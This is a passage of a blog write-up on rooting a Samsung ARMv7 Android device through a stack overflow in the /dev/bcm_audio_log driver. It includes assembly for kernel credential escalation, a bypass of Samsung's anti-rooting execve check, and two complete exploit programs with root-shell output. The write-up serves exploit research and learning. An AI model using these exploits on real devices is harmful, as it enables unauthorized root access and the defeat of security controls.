+</code></pre></div><p>In ARMv7, these instructions do not exist. However there&rsquo;s the <code>msr</code> instruction. An instruction used for settings values in the CPSR register, which is the current program status register. This register is responsible for telling the CPU whether or not it&rsquo;s in userland or kernelland. Let&rsquo;s have a quick look at the CSPR register.
+<img src=/pictures/cpsr-illustration.png alt=cpsr></p>
+<p>What we&rsquo;re interested in is the &ldquo;Mode bits&rdquo; segment. The mode is stored in the 5 least significant bits of the register. Specifically we want to set the value of these to <code>1 0 0 0 0</code>. This way we will get into user mode. Let&rsquo;s try coming up with some assembly that could perhaps achieve what we want.</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>    <span style=color:#00f>asm</span> volatile(
+	    ...
+        <span style=color:#a31515>&#34;mov r0, #0x10</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>     <span style=color:green>// register flags for user land mode
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;msr cpsr_c, r0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>    <span style=color:green>// switch back to user land
+</span><span style=color:green></span>        ...
+   );
+</code></pre></div><p>I could only find examples online that used <code>0x40000010</code>, I did not see why it was relevant to set the most significant bit, and I might be missing something, but it seems like both things work. Now the plan goes like:</p>
+<ol>
+<li>prepare_kernel_cred</li>
+<li>commit_creds</li>
+<li>Return to user land</li>
+<li>Get a shell!</li>
+</ol>
+<p>We end up with the following:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#2b91af>void</span> get_root() {
+    <span style=color:#00f>asm</span> <span style=color:#00f>volatile</span>(
+        <span style=color:#a31515>&#34;ldr     R3, =0xc00795b8</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span> <span style=color:green>// move prepare_kernel_cred address into r3
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;mov     R0, #0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// argument for prepare_kernel_cred
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx     R3</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>              <span style=color:green>// call prepare_kernel_cred
+</span><span style=color:green></span>                                      <span style=color:green>// result saved in r0
+</span><span style=color:green></span>                                      
+        <span style=color:#a31515>&#34;ldr     R3, =0xc00790dc</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span> <span style=color:green>// move commit_kernel_cred address into r3
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx     R3</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>              <span style=color:green>// call commit_creds
+</span><span style=color:green></span>                                      <span style=color:green>// should be root
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;mov r0, #0x10</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>           <span style=color:green>// register flags for user land mode
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;msr cpsr_c, r0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// switch back to user land
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;ldr r0, =shell</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// load the address of the shell function into r0
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx r0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>                  <span style=color:green>// branch to the address in r0
+</span><span style=color:green></span>   );
+}
+</code></pre></div><p>Now returning this we should be done, and we should get a shell. We don&rsquo;t. I thought this was really weird. I would get something along these lines:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>; ./run_armv7m.sh backup_tested_stuff.c
+current uid: 2000
+
+now opening bcm_audio_log
+[*] address of shell: 0x10234
+[*] trying to get shell
+
+current uid: 0
+[*] got root privileges
+[*] did not get a shell!
+</code></pre></div><p>So we&rsquo;re root suddenly, but we can&rsquo;t call execve to get a shell. I could see that we were indeed in userland, because I could create files etc. as root, using normal system calls:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#00f># pwd
+</span><span style=color:#00f></span>/data/local/tmp
+<span style=color:#00f># ls -la
+</span><span style=color:#00f></span>-rw-rw-rw- shell    shell     4468675 2023-05-15 16:44 app-debug.apk
+-rwxr-xr-x shell    shell       41084 2023-05-30 22:27 exploit
+--------w- root     root            0 2023-05-30 22:27 hello_userland
+</code></pre></div><p>Now remember the foreshadowing from earlier? The anti-rooting feature? Let&rsquo;s dig a bit deeper into that. We can by grep-magic find the source code relevant for this anti-rooting.</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:green>/* sys_execve() executes a new program.
+</span><span style=color:green> * This is called indirectly via a small wrapper
+</span><span style=color:green> */</span>
+asmlinkage <span style=color:#2b91af>int</span> sys_execve(<span style=color:#00f>const</span> <span style=color:#2b91af>char</span> __user *filenamei,
+			  <span style=color:#00f>const</span> <span style=color:#2b91af>char</span> __user *<span style=color:#00f>const</span> __user *argv,
+			  <span style=color:#00f>const</span> <span style=color:#2b91af>char</span> __user *<span style=color:#00f>const</span> __user *envp, <span style=color:#00f>struct</span> pt_regs *regs)
+{
+	<span style=color:#2b91af>int</span> error;
+	<span style=color:#2b91af>char</span> * filename;
+
+	filename = getname(filenamei);
+	error = PTR_ERR(filename);
+	<span style=color:#00f>if</span> (IS_ERR(filename))
+		<span style=color:#00f>goto</span> out;
+
+<span style=color:#00f>#if defined CONFIG_SEC_RESTRICT_FORK
+</span><span style=color:#00f></span>	<span style=color:#00f>if</span>(CHECK_ROOT_UID(current))
+		<span style=color:#00f>if</span>(sec_restrict_fork())
+		{
+			PRINT_LOG(<span style=color:#a31515>&#34;Restricted making process. PID = %d(%s) &#34;</span>
+							<span style=color:#a31515>&#34;PPID = %d(%s)</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>,
+				current-&gt;pid, current-&gt;comm,
+				current-&gt;parent-&gt;pid, current-&gt;parent-&gt;comm);
+			<span style=color:#00f>return</span> -EACCES;
+		}
+<span style=color:#00f>#endif	</span><span style=color:green>// End of CONFIG_SEC_RESTRICT_FORK
+</span><span style=color:green></span>
+	error = do_execve(filename, argv, envp, regs);
+	putname(filename);
+out:
+	<span style=color:#00f>return</span> error;
+}
+</code></pre></div><p>We see that if the config is turned on it will first check if the <code>UID</code> of the program is root, afterwards it will check the result of <code>sec_restrict_fork()</code>. Furthermore we see that there&rsquo;s a &ldquo;PRINT_LOG&rdquo;, that will tell us if this code is actually hit when we try to run <code>execve</code>. Let&rsquo;s have a look at the kernel log after we try our exploit:</p>
+<pre tabindex=0><code>&lt;3&gt;[95489.911831] C0 [        exploit] Restricted making process. PID = 20457(exploit) PPID = 20455(sh)
+&lt;3&gt;[95489.911831] C0 [        exploit] Restricted making process. PID = 20457(exploit) PPID = 20455(sh)
+&lt;3&gt;[95489.911831] C0 [        exploit] Restricted making process. PID = 20457(exploit) PPID = 20455(sh)
+</code></pre><p>Damn, so the anti-rooting is working and we won&rsquo;t be able to get shell, but why exactly? What is it checking for in <code>sec_restrict_fork()</code>? It seems we&rsquo;re hitting this case:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>	<span style=color:green>/* 3. Restrict case - execute file in /data directory.
+</span><span style=color:green>	*/</span>
+	<span style=color:#00f>if</span>( sec_check_execpath(current-&gt;mm, <span style=color:#a31515>&#34;/data/&#34;</span>) ) {
+		ret = 1;
+		<span style=color:#00f>goto</span> out;
+	}
+</code></pre></div><p>Since we&rsquo;re trying to execute a file in <code>/data</code> they know something fishy is up. Let&rsquo;s try looking for other writable places on the filesystem. Maybe we&rsquo;re lucky. Obviously this is not a good way of handling this. Playing around we see that if we just place our exploit in <code>/dev/</code>, we can get root:</p>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>exploit: 0 files pushed. 0.9 MB/s (41088 bytes in 0.046s)
+current uid: 2000
+
+now opening bcm_audio_log
+[*] address of shell: 0x10234
+[*] trying to get shell
+current uid: 0
+
+[*] got root privileges
+<span style=color:green># id</span>
+id
+uid=0(root) gid=0(root)
+</code></pre></div><h3 id=popping-a-shell-without-using-sys_execve>Popping a shell without using <code>sys_execve</code></h3>
+<p>Now another interesting way, which was what I initially ended up doing, was using the kernels own execve. This is slightly more complicated, but only slightly. We need to use the <code>getname()</code> functionality in the kernel to get the string <code>/system/bin/sh</code> into the kernel, and then execute that shell using our kernels own execve. Now we&rsquo;re done, we&rsquo;re root, and we won!</p>
+<h1 id=exploits>Exploits</h1>
+<h3 id=exploit-1-no-sys_execve>Exploit 1 (No <code>sys_execve</code>)</h3>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#00f>#include</span> <span style=color:#00f>&lt;stdio.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;unistd.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;fcntl.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;string.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;sys/syscall.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;stdlib.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;linux/kernel.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f></span>
+<span style=color:#00f>#define int32_t int
+</span><span style=color:#00f>#define int64_t long
+</span><span style=color:#00f>#define uint32_t unsigned int
+</span><span style=color:#00f>#define uint64_t unsigned long
+</span><span style=color:#00f></span>
+<span style=color:green>// global file descriptor
+</span><span style=color:green></span><span style=color:#2b91af>int</span> fd;
+
+<span style=color:green>// environment variable
+</span><span style=color:green></span><span style=color:#00f>extern</span> <span style=color:#2b91af>char</span>** environ;
+
+<span style=color:#00f>typedef</span> void (*PRINTK)(<span style=color:#2b91af>char</span>*, ...);
+PRINTK printk = (PRINTK)0xc065b688; <span style=color:green>// printk kallsyms
+</span><span style=color:green></span>                                    
+<span style=color:#00f>typedef</span> <span style=color:#2b91af>char</span>* (*GETNAME)(<span style=color:#2b91af>char</span>*);
+GETNAME getname = (GETNAME)0xc010dc30; <span style=color:green>// getname kallsyms
+</span><span style=color:green></span>                                
+<span style=color:#00f>typedef</span> int (*KERNEL_EXECVE)(<span style=color:#00f>const</span> <span style=color:#2b91af>char</span>*, ...);
+KERNEL_EXECVE kernel_execve = (KERNEL_EXECVE)0xc0011540; <span style=color:green>// kernel_execve kallsyms
+</span><span style=color:green></span>
+<span style=color:#2b91af>void</span> get_root() {
+    <span style=color:#00f>asm</span> <span style=color:#00f>volatile</span> (
+        <span style=color:#a31515>&#34;ldr     R3, =0xc00795b8</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span> <span style=color:green>// move prepare_kernel_cred address into r3
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;mov     R0, #0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// argument for prepare_kernel_cred
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx     R3</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>              <span style=color:green>// call prepare_kernel_cred
+</span><span style=color:green></span>                                      <span style=color:green>// result saved in r0
+</span><span style=color:green></span>                                      
+        <span style=color:#a31515>&#34;ldr     R3, =0xc00790dc</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span> <span style=color:green>// move commit_kernel_cred address into r3
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx     R3</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>              <span style=color:green>// call commit_kernel_cred
+</span><span style=color:green></span>                                      <span style=color:green>// should be root
+</span><span style=color:green></span>    );       
+
+    <span style=color:green>// we will call kernel_execve because of anti-rooting on samsung
+</span><span style=color:green></span>    <span style=color:#00f>static</span> <span style=color:#00f>const</span> <span style=color:#2b91af>char</span> *argv_new_proc[] = { <span style=color:#a31515>&#34;sh&#34;</span>, NULL };
+    <span style=color:#2b91af>char</span> *filename = getname(<span style=color:#a31515>&#34;/system/bin/sh&#34;</span>);
+    <span style=color:#2b91af>int</span> err = kernel_execve(filename, argv_new_proc, environ); 
+}
+
+<span style=color:#2b91af>void</span> payload() {
+    <span style=color:#2b91af>uint32_t</span> payload[164] = {0};
+    <span style=color:#2b91af>int</span> offset = 161;
+  
+    payload[offset++] = (<span style=color:#2b91af>uint32_t</span>)get_root;
+
+    <span style=color:green>// offset the address for the rop
+</span><span style=color:green></span>    <span style=color:#2b91af>char</span> new_array[<span style=color:#00f>sizeof</span>(payload) + 2] = {0};
+    memcpy(new_array + 2, payload, <span style=color:#00f>sizeof</span>(payload));
+
+    <span style=color:green>// stack go boom boom!
+</span><span style=color:green></span>    write(fd, new_array, <span style=color:#00f>sizeof</span>(new_array));
+}
+
+<span style=color:#2b91af>int</span> main() {
+    printf(<span style=color:#a31515>&#34;current uid: %d</span><span style=color:#a31515>\n\n</span><span style=color:#a31515>&#34;</span>, getuid());
+
+    printf(<span style=color:#a31515>&#34;now opening bcm_audio_log</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+    
+    fd = open(<span style=color:#a31515>&#34;/dev/bcm_audio_log&#34;</span>, O_WRONLY);
+    payload();
+
+    printf(<span style=color:#a31515>&#34;[:(] i should not hit here, something went wrong</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+}
+</code></pre></div><h3 id=exploit-2-copying-exploit-into-dev>Exploit 2 (Copying exploit into <code>/dev/</code>)</h3>
+<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#00f>#include</span> <span style=color:#00f>&lt;stdio.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;unistd.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;fcntl.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;string.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;sys/syscall.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;stdlib.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f>#include</span> <span style=color:#00f>&lt;linux/kernel.h&gt;</span><span style=color:#00f>
+</span><span style=color:#00f></span>
+<span style=color:#00f>#define int32_t int
+</span><span style=color:#00f>#define int64_t long
+</span><span style=color:#00f>#define uint32_t unsigned int
+</span><span style=color:#00f>#define uint64_t unsigned long
+</span><span style=color:#00f></span>
+<span style=color:green>// global file descriptor
+</span><span style=color:green></span><span style=color:#2b91af>int</span> fd;
+
+<span style=color:#2b91af>void</span> shell() {
+    printf(<span style=color:#a31515>&#34;[*] trying to get shell</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+    printf(<span style=color:#a31515>&#34;current uid: %d</span><span style=color:#a31515>\n\n</span><span style=color:#a31515>&#34;</span>, getuid());
+
+    <span style=color:#00f>if</span> (getuid() == 0) {
+        printf(<span style=color:#a31515>&#34;[*] got root privileges</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+
+        <span style=color:#2b91af>char</span> *args[] = {<span style=color:#a31515>&#34;/system/bin/sh&#34;</span>, NULL, NULL};
+        <span style=color:#00f>extern</span> <span style=color:#2b91af>char</span>** environ;
+        execve(args[0], args, environ);
+
+        printf(<span style=color:#a31515>&#34;[*] did not get a shell!</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+    } <span style=color:#00f>else</span> {
+        printf(<span style=color:#a31515>&#34;[:(] failed to get a root shell</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+    }    
+
+    exit(0);
+}
+
+<span style=color:#00f>extern</span> <span style=color:#2b91af>char</span>** environ;
+<span style=color:#2b91af>void</span> get_root() {
+    <span style=color:#00f>asm</span> <span style=color:#00f>volatile</span>(
+        <span style=color:#a31515>&#34;ldr     R3, =0xc00795b8</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span> <span style=color:green>// move prepare_kernel_cred address into r3
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;mov     R0, #0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// argument for prepare_kernel_cred
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx     R3</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>              <span style=color:green>// call prepare_kernel_cred
+</span><span style=color:green></span>                                      <span style=color:green>// result saved in r0
+</span><span style=color:green></span>                                      
+        <span style=color:#a31515>&#34;ldr     R3, =0xc00790dc</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span> <span style=color:green>// move commit_kernel_cred address into r3
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx     R3</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>              <span style=color:green>// call commit_kernel_cred
+</span><span style=color:green></span>                                      <span style=color:green>// should be root
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;mov r0, #0x10</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>           <span style=color:green>// register flags for user land mode
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;msr cpsr_c, r0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// switch back to user land
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;ldr r0, =shell</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>          <span style=color:green>// load the address of the shell function into r0
+</span><span style=color:green></span>        <span style=color:#a31515>&#34;blx r0</span><span style=color:#a31515>\n\t</span><span style=color:#a31515>&#34;</span>                  <span style=color:green>// branch to the address in r0
+</span><span style=color:green></span>   );
+}
+
+<span style=color:#2b91af>void</span> payload() {
+    <span style=color:#2b91af>uint32_t</span> payload[164] = {0};
+    <span style=color:#2b91af>int</span> offset = 161;
+  
+    payload[offset++] = (<span style=color:#2b91af>uint32_t</span>)get_root;
+
+    <span style=color:green>// offset the address for the rop
+</span><span style=color:green></span>    <span style=color:#2b91af>char</span> new_array[<span style=color:#00f>sizeof</span>(payload) + 2] = {0};
+    memcpy(new_array + 2, payload, <span style=color:#00f>sizeof</span>(payload));
+
+    <span style=color:green>// stack go boom boom!
+</span><span style=color:green></span>    write(fd, new_array, <span style=color:#00f>sizeof</span>(new_array));
+}
+
+<span style=color:#2b91af>int</span> main() {
+    printf(<span style=color:#a31515>&#34;current uid: %d</span><span style=color:#a31515>\n\n</span><span style=color:#a31515>&#34;</span>, getuid());
+
+    printf(<span style=color:#a31515>&#34;now opening bcm_audio_log</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>);
+    printf(<span style=color:#a31515>&#34;[*] address of shell: %p</span><span style=color:#a31515>\n</span><span style=color:#a31515>&#34;</span>, shell);
+    
+    fd = open(<span style=color:#a31515>&#34;/dev/bcm_audio_log&#34;</span>, O_WRONLY);
+    payload();
+}
+</code></pre></div><h1 id=references>References</h1>
+<p>[0]: <a href=https://en.wikipedia.org/wiki/Android_Debug_Bridge>https://en.wikipedia.org/wiki/Android_Debug_Bridge</a> <br>
+[1]: <a href="https://www.youtube.com/watch?v=g62FXds2pt8">https://www.youtube.com/watch?v=g62FXds2pt8</a> <br>
+[2]: <a href="https://developer.arm.com/documentation/ddi0406/b/System-Level-Architecture/The-System-Level-Programmers--Model/ARM-processor-modes-and-core-registers/ARM-processor-modes?lang=en#CIHGHDGI">https://developer.arm.com/documentation/ddi0406/b/System-Level-Architecture/The-System-Level-Programmers--Model/ARM-processor-modes-and-core-registers/ARM-processor-modes?lang=en#CIHGHDGI</a></p>
+</div>
+<div class="row middle-xs">
+<div class=col-xs-12>
+</div>
+</div>
+<div class=row>
+<div class=col-xs-12>
+</div>
+</div>
+<div style=height:50px></div>
+<div class=site-footer>
+</div>
+</div>
+</div>
+</article>
+<script></script>
+</body>
+</html>
